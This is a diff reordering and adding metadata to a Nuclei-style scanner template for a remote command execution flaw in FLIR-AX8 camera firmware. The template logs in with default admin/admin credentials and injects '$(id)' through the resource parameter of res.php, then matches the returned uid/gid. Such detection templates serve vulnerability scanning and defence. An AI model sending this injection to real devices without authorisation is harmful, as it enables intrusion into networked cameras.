@@ -1,5 +1,4 @@
 id: flir-ax8-rce
-
 info:
   name: FLIR-AX8 res.php - Remote Code Execution
   author: momika233
@@ -7,22 +6,43 @@ info:
   description: |
     Remote Command Execution vulnerability in the FLIR-AX8 res.php file, the attacker obtains server permissions after logging in to the background with the default password.
   reference:
-    - https://www.exploit-db.com/exploits/45602
     - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/iot/%E8%8F%B2%E5%8A%9B%E5%B0%94/FLIR-AX8%20res.php%20%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://www.exploit-db.com/exploits/45602
   classification:
     cpe: cpe:2.3:o:flir:flir_ax8_firmware:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag authenticated
-    verified: true
+    fofa-query: app="FLIR-FLIR-AX8"
     max-request: 2
+    product: flir_ax8_firmware
     vendor: flir
-  tags: flir-ax8,rce,exploitdb,iot,sensor,authenticated,vuln
+    verified: true
+  tags: authenticated,exploitdb,flir-ax8,iot,rce,sensor,vuln
 variables:
-  username: admin
   password: admin
-
+  username: admin
 http:
-  - raw:
+  - extractors:
+      - part: body_2
+        regex:
+          - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid')
+          - contains(body_1, 'success')
+          - status_code_1 == 200 && status_code_2 == 200
+        type: dsl
+      - part: body_2
+        regex:
+          - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)
+        type: regex
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /login/dologin HTTP/1.1
         Host: {{Hostname}}
@@ -35,28 +55,3 @@ http:
         Content-Type: application/x-www-form-urlencoded
 
         action=node&resource=$(id)
-
-    matchers-condition: and
-    matchers:
-      - type: dsl
-        dsl:
-          - contains_all(to_lower(header_1), 'text/html','phpsessid','showcameraid')
-          - contains(body_1, 'success')
-          - status_code_1 == 200 && status_code_2 == 200
-        condition: and
-
-      - type: regex
-        part: body_2
-        regex:
-          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
-
-      - type: status
-        status:
-          - 200
-
-    extractors:
-      - type: regex
-        part: body_2
-        regex:
-          - 'uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)'
-
